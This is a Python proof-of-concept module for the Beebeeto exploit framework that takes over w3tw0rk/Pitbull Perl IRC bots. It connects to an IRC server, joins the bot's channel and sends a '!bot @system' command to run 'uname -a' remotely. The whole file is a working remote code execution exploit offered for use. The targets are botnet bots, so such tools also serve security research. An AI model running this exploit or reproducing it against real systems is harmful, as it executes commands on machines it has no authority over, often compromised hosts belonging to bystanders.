#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import socket
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0077',
            'name': 'w3tw0rk / Pitbull Perl IRC Bot 远程代码执行漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2015-04-07',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [6667],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'w3tw0rk / Pitbull Perl IRC',
            'vul_version': ['*'],
            'type': 'Code Execution',
            'tag': ['w3tw0rk / Pitbull Perl IRC Bot 漏洞', 'w3tw0rk / Pitbull Perl IRC Bot Vulnerability'],
            'desc': '''
                    pitbull-w3tw0rk_hunter is POC exploit for Pitbull or w3tw0rk IRC Bot
                    that takes over the owner of a bot which then allows Remote Code Execution.
                    ''',
            'references': ['http://www.exploit-db.com/exploits/36652/',
            ],
        },
    }

    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-c','--channel',
                                    action='store', dest='channel', type='string', default=None,
                                    help='IRC channel')
        self.user_parser.add_option('-n','--nick',
                                    action='store', dest='nick', type='string', default='beebeeto',
                                    help='IRC nick')

    @classmethod
    def verify(cls, args):
        #irc server connection settings
        server = args['options']['target']  # IRC Server
        botnick = args['options']['nick']   # admin payload for taking over the w3wt0rk bot
        channel = "#%s"%args['options']['channel']  #channel where the bot is located

        irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
        print "connecting to: " + server
        irc.connect((server, 6667)) #connects to the server
        irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :I eat w3tw0rk bots!\n") #user authentication
        irc.send("NICK "+ botnick +"\n") #sets nick
        irc.send("JOIN "+ channel +"\n") #join the chan
        irc.send("PRIVMSG "+channel+" :!bot @system 'uname -a' \n") #send the payload to the bot

        #puts it in a loop
        while True:
            text = irc.recv(2040)
            print text  #print text to console
            if text.find('PING') != -1:                       #check if 'PING' is found
                irc.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
            if text.find('!quit') != -1: #quit the Bot
                irc.send ("QUIT\r\n") 
                return args
            if text.find('Linux') != -1:                         
                irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
                irc.send ("QUIT\r\n")
                args['success'] = True
                return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())